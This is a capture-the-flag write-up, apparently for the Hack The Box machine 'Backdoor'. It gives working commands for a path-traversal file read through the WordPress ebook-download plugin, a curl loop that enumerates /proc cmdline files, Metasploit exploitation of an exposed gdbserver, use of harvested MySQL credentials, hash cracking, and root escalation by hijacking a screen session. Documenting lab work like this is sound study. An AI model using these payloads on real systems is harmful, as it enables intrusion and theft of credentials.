#LFI #/proc #screen
# nmap 

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 10:35 CDT
Nmap scan report for 10.129.96.68
Host is up (0.0025s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds

```

# domain found on network logs on devtools backdoor.htb
![[Pasted image 20241031233855.png]]

# site uses wordpress 5.8.1

> scanned the site using wpscann

```shell
wpscan --url backdoor.htb
```

# unauthenticated user can access wp-content/uploads 
![[Pasted image 20241031235208.png]]

# ebook-download plugin found from /wp-content/plugins

> which has a CVE https://www.exploit-db.com/exploits/39575

# Enumerated /proc files to check for running processes, downloaded /proc/sched_debug

```shell
http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/sched_debug
```


source: https://www.netspi.com/blog/technical-blog/web-application-pentesting/directory-traversal-file-inclusion-proc-file-system/


# Created a bash script that downloads processes on the /proc file /proc/n/cmdline

```shell
for i in {1..1000}; do curl http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline -o $i; ; done
```

> cmdline is the equivalent of binPath in windows


# And a script that looks for process that runs on port 1337

```shell
 for i in $(find . -type f -size +90c); do cat $i | grep 1337; if [[ $? == "0" ]]; then echo "$i \n"; cat $i; fi  done

/proc/964/cmdline/proc/964/cmdline/proc/964/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"

```


# The exploit has a metasploit module /multi/gdb/gdb_server_exec 

> changed the payload and target to x64 architecture

![[Pasted image 20241101150434.png]]

# Tried using the mysql credentials found from wp-config.php

```shell
mysql -h localhost -u wordpressuser -pMQYBJSaD#DxG6qbm wordpress -e "show databases;"

mysql -h localhost -u wordpressuser -pMQYBJSaD#DxG6qbm  wordpress -e "select * from wp_users;"

# found admin credentials

ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_activation_key	user_status	display_name
1	admin	$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.	admin	admin@wordpress.com	http://backdoor.htb	2021-07-24 13:19:11		0	admin


```



# Password cracking
```shell
hashcat -m 400 -a 0 pass.txt /usr/share/wordlists/rockyou.txt 

```

>unable to crack password hash found from mysql



# Linpeas.sh results
```shell
root         962  0.0  0.0   2608  1652 ?        Ss   02:07   0:07      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done

```

> root user created a screen session, screen command has the same functionality as tmux#

```shell
 screen -dmS root
```

> reattached the session using -r 

```shell
screen -r root/
```

